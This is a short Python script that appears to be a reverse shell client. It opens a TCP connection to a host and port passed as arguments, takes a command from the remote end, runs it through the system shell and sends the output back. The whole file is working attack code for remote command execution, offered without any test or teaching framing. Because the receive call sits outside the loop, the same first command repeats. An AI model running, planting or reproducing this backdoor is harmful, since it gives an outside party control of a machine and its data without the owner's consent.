import socket
import sys
import subprocess as sp


host = str(sys.argv[1])
port = int(sys.argv[2])
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host, port))
command=s.recv(1024)
command =str(command.decode())
while 1:
	if command != "exit()":
		op= sp.Popen(command, shell=True, stderr=sp.PIPE, stdout=sp.PIPE, stdin=sp.PIPE)
		
		out, err = op.communicate()
		
		result=str(out)
		length=str(len(result)).zfill(16)
		StringToEncode=length+result
		StringToSend=StringToEncode.encode()
		s.send(StringToSend)
		
	
	
	else:
		break
s.close()
 


